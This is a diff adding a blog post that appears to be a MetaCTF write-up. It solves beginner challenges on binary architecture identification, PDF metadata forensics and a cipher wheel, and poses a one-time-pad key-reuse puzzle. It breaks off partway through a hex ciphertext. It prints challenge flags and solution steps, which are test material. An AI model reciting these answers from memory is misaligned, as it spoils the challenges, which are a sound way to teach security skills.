@@ -126,6 +126,332 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-metactf" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/12/21/metactf/" class="article-date">
+  	<time datetime="2024-12-21T12:32:07.087Z" itemprop="datePublished">2024-12-21</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/12/21/metactf/">
+        METACTF
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Take a look at ConnectWind’s internal employee portal. In addition to company policies &amp; HR information, I heard it also stores flags.</p>
+<p>Can you access the protected employee portal without knowing the password and steal the flag?</p>
+<p><img src="/img/metactfimage.png" alt="image.png"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://metaproblems.com/71c5b42eb77639d5224be5589123de30/employee_portal.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/metactfimage1.png" alt="image.png"></p>
+<hr>
+<p>We recovered this executable from a device, but we can’t figure out how to make the program run. We suspect the code was compiled for a system with a different CPU architecture.</p>
+<p>Can you figure out which architecture it was compiled for? The flag is the name of the architecture. You don’t need to run or take apart the executable.</p>
+<p>The flag is not in MetaCTF{} format, it’s just the name of the architecture. You only have 10 attempts on this challenge.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌─[root@parrot]─[/home/kali/Desktop]</span><br><span class="line">└──╼ <span class="comment">#file astronaut </span></span><br><span class="line">astronaut: ELF 32-bit LSB executable, Tensilica Xtensa, version 1 (SYSV), statically linked, with debug_info, not stripped</span><br><span class="line">┌─[root@parrot]─[/home/kali/Desktop]</span><br><span class="line">└──╼ <span class="comment">#readelf -h  astronaut </span></span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF32</span><br><span class="line">  Data:                              2<span class="string">&#x27;s complement, little endian</span></span><br><span class="line"><span class="string">  Version:                           1 (current)</span></span><br><span class="line"><span class="string">  OS/ABI:                            UNIX - System V</span></span><br><span class="line"><span class="string">  ABI Version:                       0</span></span><br><span class="line"><span class="string">  Type:                              EXEC (Executable file)</span></span><br><span class="line"><span class="string">  Machine:                           Tensilica Xtensa Processor</span></span><br><span class="line"><span class="string">  Version:                           0x1</span></span><br><span class="line"><span class="string">  Entry point address:               0x400d3128</span></span><br><span class="line"><span class="string">  Start of program headers:          52 (bytes into file)</span></span><br><span class="line"><span class="string">  Start of section headers:          1007004 (bytes into file)</span></span><br><span class="line"><span class="string">  Flags:                             0x0</span></span><br><span class="line"><span class="string">  Size of this header:               52 (bytes)</span></span><br><span class="line"><span class="string">  Size of program headers:           32 (bytes)</span></span><br><span class="line"><span class="string">  Number of program headers:         6</span></span><br><span class="line"><span class="string">  Size of section headers:           40 (bytes)</span></span><br><span class="line"><span class="string">  Number of section headers:         33</span></span><br><span class="line"><span class="string">  Section header string table index: 32</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Tensilica Xtensa</p>
+</blockquote>
+<hr>
+<p>Your anonymous music producer friend (D34DM0053) is getting ready to publish an open letter on mental health in the music industry, but they don’t know much about computers. Can you help double check their letter to make sure it isn’t leaking their identity?</p>
+<p><a target="_blank" rel="noopener" href="https://metaproblems.com/0778e85952c806a4f55fb61d12fd8ca0/D34DM0053_Open_Letter_Mental_Health.pdf">Here’s the letter in question.</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌─[root@parrot]─[/home/kali/Desktop]</span><br><span class="line">└──╼ <span class="comment">#pdf-parser D34DM0053_Open_Letter_Mental_Health.pdf </span></span><br><span class="line">This program has not been tested with this version of Python (3.11.2)</span><br><span class="line">Should you encounter problems, please use Python version 3.11.1</span><br><span class="line">PDF Comment <span class="string">&#x27;%PDF-1.4\n&#x27;</span></span><br><span class="line"></span><br><span class="line">PDF Comment <span class="string">&#x27;%\xc3\xa4\xc3\xbc\xc3\xb6\xc3\x9f\n&#x27;</span></span><br><span class="line"></span><br><span class="line">obj 2 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: 3 0 R</span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 3 0 R</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 3 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"></span><br><span class="line">obj 4 0</span><br><span class="line"> Type: /XObject</span><br><span class="line"> Referencing: 5 0 R</span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /XObject</span><br><span class="line">    /Subtype /Image</span><br><span class="line">    /Width 1920</span><br><span class="line">    /Height 1920</span><br><span class="line">    /BitsPerComponent 8</span><br><span class="line">    /ColorSpace /DeviceGray</span><br><span class="line">    /Filter /DCTDecode</span><br><span class="line">    /Length 68385</span><br><span class="line">    /SMask 5 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 5 0</span><br><span class="line"> Type: /XObject</span><br><span class="line"> Referencing: 6 0 R</span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /XObject</span><br><span class="line">    /Subtype /Image</span><br><span class="line">    /Width 1920</span><br><span class="line">    /Height 1920</span><br><span class="line">    /BitsPerComponent 8</span><br><span class="line">    /Length 6 0 R</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">    /ColorSpace /DeviceGray</span><br><span class="line">    /Decode [ 1 0 ]</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 6 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"></span><br><span class="line">obj 8 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: 9 0 R</span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 9 0 R</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">    /Length1 19844</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 9 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"></span><br><span class="line">obj 10 0</span><br><span class="line"> Type: /FontDescriptor</span><br><span class="line"> Referencing: 8 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /FontDescriptor</span><br><span class="line">    /FontName /EAAAAA+DejaVuSans-BoldOblique</span><br><span class="line">    /Flags 68</span><br><span class="line">    /FontBBox [-1066 -385 1998 1121]</span><br><span class="line">    /ItalicAngle -30</span><br><span class="line">    /Ascent 928</span><br><span class="line">    /Descent -235</span><br><span class="line">    /CapHeight 1120</span><br><span class="line">    /StemV 80</span><br><span class="line">    /FontFile2 8 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 11 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 247</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 12 0</span><br><span class="line"> Type: /Font</span><br><span class="line"> Referencing: 10 0 R, 11 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Font</span><br><span class="line">    /Subtype /TrueType</span><br><span class="line">    /BaseFont /EAAAAA+DejaVuSans-BoldOblique</span><br><span class="line">    /FirstChar 0</span><br><span class="line">    /LastChar 6</span><br><span class="line">    /Widths [600 830 695 695 995 695 695 ]</span><br><span class="line">    /FontDescriptor 10 0 R</span><br><span class="line">    /ToUnicode 11 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 13 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: 14 0 R</span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 14 0 R</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">    /Length1 22720</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 14 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"></span><br><span class="line">obj 15 0</span><br><span class="line"> Type: /FontDescriptor</span><br><span class="line"> Referencing: 13 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /FontDescriptor</span><br><span class="line">    /FontName /DAAAAA+DejaVuSans-Oblique</span><br><span class="line">    /Flags 68</span><br><span class="line">    /FontBBox [-1015 -350 1659 1068]</span><br><span class="line">    /ItalicAngle -30</span><br><span class="line">    /Ascent 928</span><br><span class="line">    /Descent -235</span><br><span class="line">    /CapHeight 1067</span><br><span class="line">    /StemV 80</span><br><span class="line">    /FontFile2 13 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 16 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 304</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 17 0</span><br><span class="line"> Type: /Font</span><br><span class="line"> Referencing: 15 0 R, 16 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Font</span><br><span class="line">    /Subtype /TrueType</span><br><span class="line">    /BaseFont /DAAAAA+DejaVuSans-Oblique</span><br><span class="line">    /FirstChar 0</span><br><span class="line">    /LastChar 18</span><br><span class="line">    /Widths <span class="string">&#x27;[600 974 612 591 634 615 317 591 633 611 633 317 411 634 277 634\n392 633 520 ]&#x27;</span></span><br><span class="line">    /FontDescriptor 15 0 R</span><br><span class="line">    /ToUnicode 16 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 18 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: 19 0 R</span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 19 0 R</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">    /Length1 27680</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 19 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"></span><br><span class="line">obj 20 0</span><br><span class="line"> Type: /FontDescriptor</span><br><span class="line"> Referencing: 18 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /FontDescriptor</span><br><span class="line">    /FontName /CAAAAA+DejaVuSans</span><br><span class="line">    /Flags 4</span><br><span class="line">    /FontBBox [-1020 -462 1793 1233]</span><br><span class="line">    /ItalicAngle 0</span><br><span class="line">    /Ascent 928</span><br><span class="line">    /Descent -235</span><br><span class="line">    /CapHeight 1232</span><br><span class="line">    /StemV 80</span><br><span class="line">    /FontFile2 18 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 21 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 458</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 22 0</span><br><span class="line"> Type: /Font</span><br><span class="line"> Referencing: 20 0 R, 21 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Font</span><br><span class="line">    /Subtype /TrueType</span><br><span class="line">    /BaseFont /CAAAAA+DejaVuSans</span><br><span class="line">    /FirstChar 0</span><br><span class="line">    /LastChar 53</span><br><span class="line">    /Widths <span class="string">&#x27;[600 751 615 591 317 591 411 611 633 317 294 317 974 392 612 579\n277 634 634 520 634 634 549 352 633 633 277 1000 317 591 774 817\n277 631 988 360 684 686 770 636 636 336 636 610 862 694 524 336\n294 500 557 634 634 603 ]&#x27;</span></span><br><span class="line">    /FontDescriptor 20 0 R</span><br><span class="line">    /ToUnicode 21 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 23 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: 24 0 R</span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 24 0 R</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">    /Length1 24704</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 24 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"></span><br><span class="line">obj 25 0</span><br><span class="line"> Type: /FontDescriptor</span><br><span class="line"> Referencing: 23 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /FontDescriptor</span><br><span class="line">    /FontName /BAAAAA+DejaVuSans-Bold</span><br><span class="line">    /Flags 4</span><br><span class="line">    /FontBBox [-1069 -415 1975 1175]</span><br><span class="line">    /ItalicAngle 0</span><br><span class="line">    /Ascent 928</span><br><span class="line">    /Descent -235</span><br><span class="line">    /CapHeight 1174</span><br><span class="line">    /StemV 80</span><br><span class="line">    /FontFile2 23 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 26 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 379</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 27 0</span><br><span class="line"> Type: /Font</span><br><span class="line"> Referencing: 25 0 R, 26 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Font</span><br><span class="line">    /Subtype /TrueType</span><br><span class="line">    /BaseFont /BAAAAA+DejaVuSans-Bold</span><br><span class="line">    /FirstChar 0</span><br><span class="line">    /LastChar 35</span><br><span class="line">    /Widths <span class="string">&#x27;[600 850 715 678 711 348 637 478 493 715 651 830 695 695 995 695\n695 399 773 715 595 342 715 674 342 836 711 711 592 372 682 665\n732 687 435 379 ]&#x27;</span></span><br><span class="line">    /FontDescriptor 25 0 R</span><br><span class="line">    /ToUnicode 26 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 28 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: 27 0 R, 22 0 R, 17 0 R, 12 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /F1 27 0 R</span><br><span class="line">    /F2 22 0 R</span><br><span class="line">    /F3 17 0 R</span><br><span class="line">    /F4 12 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 29 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: 28 0 R, 4 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Font 28 0 R</span><br><span class="line">    /XObject</span><br><span class="line">      &lt;&lt;</span><br><span class="line">        /Im4 4 0 R</span><br><span class="line">      &gt;&gt;</span><br><span class="line">    /ProcSet [/PDF/Text/ImageC/ImageI/ImageB]</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 1 0</span><br><span class="line"> Type: /Page</span><br><span class="line"> Referencing: 7 0 R, 29 0 R, 2 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Page</span><br><span class="line">    /Parent 7 0 R</span><br><span class="line">    /Resources 29 0 R</span><br><span class="line">    /MediaBox [0 0 612 792]</span><br><span class="line">    /Group</span><br><span class="line">      &lt;&lt;</span><br><span class="line">        /S /Transparency</span><br><span class="line">        /CS /DeviceRGB</span><br><span class="line">        /I <span class="literal">true</span></span><br><span class="line">      &gt;&gt;</span><br><span class="line">    /Contents 2 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 30 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: 31 0 R, 31 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Count 1</span><br><span class="line">    /First 31 0 R</span><br><span class="line">    /Last 31 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 31 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: 1 0 R, 30 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Count 0</span><br><span class="line">    /Title &lt;FEFF004F00700065006E0020004C0065007400740065007200200062007900200044003300340044004D0030003000350033003A002000410064006400720065007300730069006E00670020004D0065006E00740061006C0020004800650061006C0074006800200069006E00200074006800650020004D007500730069006300200049006E006400750073007400720079&gt;</span><br><span class="line">    /Dest [1 0 R/XYZ 57.8 723.3 0]</span><br><span class="line">    /Parent 30 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 7 0</span><br><span class="line"> Type: /Pages</span><br><span class="line"> Referencing: 29 0 R, 1 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Pages</span><br><span class="line">    /Resources 29 0 R</span><br><span class="line">    /MediaBox [ 0 0 612 792 ]</span><br><span class="line">    /Kids [ 1 0 R ]</span><br><span class="line">    /Count 1</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 32 0</span><br><span class="line"> Type: /Catalog</span><br><span class="line"> Referencing: 7 0 R, 1 0 R, 30 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Catalog</span><br><span class="line">    /Pages 7 0 R</span><br><span class="line">    /OpenAction [1 0 R /XYZ null null 0]</span><br><span class="line">    /Outlines 30 0 R</span><br><span class="line">    /Lang (en-US)</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 33 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Author &lt;FEFF005700720065006E0020004700610069006C006C006100720064&gt;</span><br><span class="line">    /Creator &lt;FEFF005700720069007400650072&gt;</span><br><span class="line">    /Producer &lt;FEFF004F00700065006E004F0066006600690063006500200034002E0031002E00310035&gt;</span><br><span class="line">    /CreationDate <span class="string">&quot;(D:20240611094236-07&#x27;00&#x27;)&quot;</span></span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">xref</span><br><span class="line"></span><br><span class="line">trailer</span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Size 34</span><br><span class="line">    /Root 32 0 R</span><br><span class="line">    /Info 33 0 R</span><br><span class="line">    /ID [&lt;6A32CEB08765720BBF31DFA7A21F882C&gt;&lt;6A32CEB08765720BBF31DFA7A21F882C&gt;]</span><br><span class="line">    /DocChecksum /08FCFC973F8A3C64A209C049EAE7FE05</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">startxref 123882</span><br><span class="line"></span><br><span class="line">PDF Comment <span class="string">&#x27;%%EOF\n&#x27;</span></span><br><span class="line"></span><br><span class="line">PDF Comment <span class="string">&#x27;%BeginExifToolUpdate\n&#x27;</span></span><br><span class="line"></span><br><span class="line">obj 32 0</span><br><span class="line"> Type: /Catalog</span><br><span class="line"> Referencing: 7 0 R, 1 0 R, 30 0 R, 34 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Catalog</span><br><span class="line">    /Pages 7 0 R</span><br><span class="line">    /OpenAction [ 1 0 R /XYZ null null 0 ]</span><br><span class="line">    /Outlines 30 0 R</span><br><span class="line">    /Lang (en-US)</span><br><span class="line">    /Metadata 34 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 33 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Author (MetaCTF&#123;Wren_Gaillard&#125;)</span><br><span class="line">    /Creator &lt;FEFF005700720069007400650072&gt;</span><br><span class="line">    /Producer &lt;FEFF004F00700065006E004F0066006600690063006500200034002E0031002E00310035&gt;</span><br><span class="line">    /CreationDate <span class="string">&quot;(D:20240611094236-07&#x27;00&#x27;)&quot;</span></span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 34 0</span><br><span class="line"> Type: /Metadata</span><br><span class="line"> Referencing: </span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Metadata</span><br><span class="line">    /Subtype /XML</span><br><span class="line">    /Length 2802</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">xref</span><br><span class="line"></span><br><span class="line">PDF Comment <span class="string">&#x27;%EndExifToolUpdate 124767\n&#x27;</span></span><br><span class="line"></span><br><span class="line">trailer</span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Size 35</span><br><span class="line">    /Root 32 0 R</span><br><span class="line">    /Info 33 0 R</span><br><span class="line">    /ID [&lt;6A32CEB08765720BBF31DFA7A21F882C&gt;&lt;6b32CEB08765720BBF31DFA7A21F882C&gt;]</span><br><span class="line">    /DocChecksum /08FCFC973F8A3C64A209C049EAE7FE05</span><br><span class="line">    /Prev 123882</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">startxref 128031</span><br><span class="line"></span><br><span class="line">PDF Comment <span class="string">&#x27;%%EOF\n&#x27;</span></span><br><span class="line"></span><br><span class="line">┌─[root@parrot]─[/home/kali/Desktop]</span><br><span class="line">└──╼ <span class="comment">#pdf-parser D34DM0053_Open_Letter_Mental_Health.pdf | grep Meta</span></span><br><span class="line">    /Metadata 34 0 R</span><br><span class="line">    /Author (MetaCTF&#123;Wren_Gaillard&#125;)</span><br><span class="line"> Type: /Metadata</span><br><span class="line">    /Type /Metadata</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>My friend wanted to communicate using a secret cipher.</p>
+<p>He gave me the message RKPUYPFCIAKKJMYZZJT along with this wheel:</p>
+<p><img src="/img/metactfimage2.png" alt="image.png"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import string</span><br><span class="line"></span><br><span class="line">outer = string.ascii_uppercase + <span class="string">&quot;&#123;&#125;&quot;</span></span><br><span class="line">inner = <span class="string">&quot;COSDHG&#123;QNFUVWLEZYXPTKMR&#125;ABJI&quot;</span></span><br><span class="line"></span><br><span class="line">msg = <span class="string">&quot;RKPUYPFCIAKKJMYZZJT&quot;</span></span><br><span class="line"></span><br><span class="line">def decrypt(msg, outer, inner):</span><br><span class="line">    <span class="keyword">for</span> rotation <span class="keyword">in</span> range(len(outer)):</span><br><span class="line">        rotated_inner = inner[rotation:] + inner[:rotation]</span><br><span class="line">        lookup = dict(zip(outer, rotated_inner))</span><br><span class="line">        decrypted_msg = <span class="string">&quot;&quot;</span>.<span class="built_in">join</span>(lookup[c] <span class="keyword">for</span> c <span class="keyword">in</span> msg)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;META&#x27;</span> <span class="keyword">in</span> decrypted_msg:</span><br><span class="line">            <span class="built_in">print</span>(f<span class="string">&quot;Rotation &#123;rotation&#125;: &#123;decrypted_msg&#125;&quot;</span>)</span><br><span class="line">decrypt(msg, outer, inner)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Rotation 4: METACTF{WHEELYCOOL}</p>
+</blockquote>
+<hr>
+<p>We intercepted some communications by an enemy cyber actor, and we believe it’s possible to break their encryption scheme. We know they’re using some form of a one-time pad, but fatally, they’re reusing the key across all their messages. We know the group likes classical books, with one of the actors recently being into Charles Dickens, but we don’t have much else to go off of.</p>
+<p>Please break these communications to get the password they’ve sent each other!</p>
+<p>This tool (or a similar one) might come in handy.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">We intercepted some communications by an enemy cyber actor, and we believe it<span class="string">&#x27;s possible to break their encryption scheme. We know they&#x27;</span>re using some form of a one-time pad, but fatally, they<span class="string">&#x27;re reusing the key across all their messages. We know the group likes classical books, with one of the actors recently being into Charles Dickens, but we don&#x27;</span>t have much <span class="keyword">else</span> to go off of. Please <span class="built_in">break</span> these communications to get the password they<span class="string">&#x27;ve sent each other!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Encrypted message 1 (hex):</span></span><br><span class="line"><span class="string">e0261e3f44788a669ff87710eb149eba87a9b7ce2abb92b45e862de035485ad02aff59e980e5b0db1657332f202bebb0abe591b6137d93854cddd82ad670caf50431b73fa787741a348e8166791c39ef396c658c1313dac4ac82ff5a948211c9503bb9318376d1a61f45c277ac6ac62e4cdfbf3a40753206b661e4bf4e99575d4253c8feaa6b43eb5b8fc415fa2173c497f0e2573671613aa04d72b5daa5aafcb7fd45850739053965c49016276c733b724e67f976b9ee61a633f95b1286435dc491cec07baf506949f97a56c20870c0b6cfe0e81a96bec40628e407e25d573a35f7c3f9f1af533a363e65b87e7b3948f0d138d2f9e8678e9fc38c83e4202cf00570c386d5fc334314936148efc4fc27db06315d9131fa0455d31e4349a7343ed87f152ace3a1f62552ba00bc36228ef5da754239273453634bdab2a4a6f3c12e3c94b91bbf7c521ca22ff84cb7aac3083a2a252fab727c4f1fcef43d7c32b4f2ba70b32eeefabd1da10980932d3af79c0f8c069ed09f73ef69793ddf7256b6c9473be6ca7907b065e0a0965418fc2daf03abf308c55639d827ea41b4a9a1874b41bfc2cf809083593bda5de46e306e142f9c65716eb1f1670bb8a4367b1920fb5490387b64c9ad105365dd9e812a044a70bfcc5fa6d01ae325aff2db252307c01d54f2d6c8764651a90ab69eb8146ead1c318a952fcd4648764e450f84e7cca18ddb8f0bd0f405a320a3ed8ce79bf0767ea1ed2915664082ad3d7671b59b79b7d9d5a7948952923fc2537fd14a40ac98344fe927adfbf805b39974fb525aeb7dceabcf58c363c04232ede54cfc0f02169ac06293e322d1ccceb1927f3a1c70328226b4dd812ee33df05a1728769167a25e245b58eb5ada6b26b71b0d7cdae8115d950a1824b445fb197e20318d61b69385ff5cc10600419209239735105f3feb09dfcad6b3a42aba213cb997e5cce2e04df6299fefaea04d9fd17819fd24477cf15d1fd0644cafed146175753a166a9344be3a8163fe855c71017b041ef49e2eff087d9de753b4f1518ca989b5f326407f82b0f98ecbdc9b900c075bed589c348d0e0b623658a31ddec507abce8518add4d9b00a847354f000da85303f704e722277102296f2bc62e6a4374d1f9f0ea56923ab84cade47ac393be38adfc67a3db39d29d08e6bc86ab987266618476daba54c678ae48658dc44e37974732347e95448d4b3fd88473df9875304d941f4009accace8bb696c6f266faf681a77b214a35312584c0ef835a0fea60e8eb0b3155908f97601a8596ba846f88ad63c197b266e2730d0b58e3c43262303528e1dbef86</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Encrypted message 2 (hex):</span></span><br><span class="line"><span class="string">ee205b29512bc37692fc7706e1479fe98defe3d22aa5d79f3df464ff70461bd765ab54e2c3e0a6d91103722c2a2bf0bfe6ef97e8137788c856c9c563c179dbbc0a38a133e88f3b1a7d94912e671070eb3d23619e0951c2c9e9d6f11d9acc11d8502abe3f9b3fd5ab5652d424f42bc33105c6b96901633516e225b4990d92165c0407cff7aa225fe2028fcc0fa37661d2d4f6ef46367d7f75b74d37facbeab1feb0af429406751f24728bd55f2724617a592141b178fce424ae33b6595d874218fad8ddc06eed506153a02d58d7086bdda1cff6e31897a8da5222e607cb5956223af5d5f9f1af533a362471b82a2f3348f0cb25d0fff573c792c9c9cbff3f69be577cd6cd8ebd320a07937057b8e4b237d1547a5c9866be0e48c65f455dab79309d3c0429cf680971532cab16df7266ee0fac542b9972006120bda77e58667013ecca4b92b1a3de27c920ab8ec772a46287e0b854a2b73bc4a8abf854c7902f0f67e51929a7c8eb9c9e0a9f1e3487fb65ceaca865f858e170bcde8addf9724f708824be79e790700c43431d654283c49fe721bf338c4963bbd673af0a1894097933ff4831fe40087d91aaa28107f00ba40be7835117e15b506ea88a1734aede08b75e0dcb9600939d513c5dd9eb05ab53ab0befc5f36706e73c1ea964b61a37614dc3003760d36323558cad3aae9940ef82da11bb48af95629c63e50eb153618818dda2ebbe03410e341c77c3c93ab71f34be14d68c186d4778d9da67525db79e35ce1c6252d06e2ffc2f63f708f01f8ad117f4c45a93e7c85d22d053a960e7b089edb6f28c33680f306b8959d9c2a23063ac1a2a70356205d4ef4b3ee1bdda54283e6314857d9406c501a772cb675d2814aa41b595bdb0b2e5736aa09f84bc8134dd56a7a43f6845a5c5b20f2392087d2e4da1c7191f441867a57b22411ec0fce883b4f8782409a7cb5bc9d52a46ce6f13df3094f1fca14bd0a826cf8cd10560c45bd1fa014ed6bad13b22760ca14ea92c47e3bb163ce9448f4302f15ffa1beaecf099d0c8217a431e57c0988344777501bd7c0998ecf8dab90bc46fbf9488c70bd3a3e46c72c530bfd9205deeba718c980c9a02a848674d011ba1194d991ee72627770d6c7864c72f3e4168c0aabfed479222bf1fe0fe36c093ba32adb567ae9a2687910efabcc8ead6057a618461ddb100d878b05f36d9c34d37934e24600d824a975a6dc79a658c896f2308814a5b1afec38fca979bdaf264fbfcd